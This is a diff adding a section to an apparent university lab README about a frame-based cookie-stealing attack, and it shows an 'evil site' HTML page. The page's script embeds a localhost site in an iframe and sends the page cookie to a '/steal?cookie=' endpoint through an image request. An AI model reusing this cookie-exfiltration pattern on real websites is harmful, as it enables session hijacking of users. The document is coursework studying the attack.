@@ -264,3 +264,59 @@ if "Iframe not loaded" in outcome:
 
 ## Q2: Frame attack
 
+### List of directories
+
+  * Code
+    * [Server 1: Evil server](code/evil_server.js)
+    * [Server 2: Victim server](code/victim.js)
+    * [Server 3: Secure server](code/secure.js)    
+    * [HTML 1: HTML having the victim site framed](code/files/html/stolencookie.html)
+    * [HTML 2: HTML having the secure site framed](code/files/html/securecookie.html)
+    
+### Youtube Video: https://youtu.be/uXC6dfXpam0
+
+### Succesful Attack
+
+* HTML
+
+```html
+$ cat files/html/stolencookie.html 
+<html>
+<title>
+Himarsha's Evil Site
+</title>
+
+
+<h1>Welcome to my evil page! - Successful attack</h1>
+Himarsha Jayanetti, CS595 - Spring 2021, ODU
+<br><br>
+This page is created to demonstrate how to steal cookies from a embedded (inside an iframe) site on another HTML at a cross origin domain.
+<br><br>
+The iframe cookie can be displayed outside of iframe. Wait for 5 seconds and you will see the main page cookie and iframe cookie appear.
+<p>
+<p>
+
+<script>
+    document.cookie = 'main=cookie'
+    const iframe = document.createElement('iframe')
+    iframe.src = 'http://localhost:5002/'
+    document.body.appendChild(iframe)
+    document.write(iframe.contentDocument.cookie)
+    console.log(iframe.contentDocument.cookie)
+
+    // wait 5 seconds
+    setTimeout(function() {
+    const p = document.createElement('p')
+    p.innerHTML = document.cookie   /*iframe.contentDocument.cookie */
+    document.body.appendChild(p)
+
+    new Image().src = 'http://localhost:5002/steal?cookie=' + document.cookie  /*iframe.contentDocument.cookie*/
+}, 5000);
+</script>
+
+```
+
+### Unsuccesful Attack
+
+
+
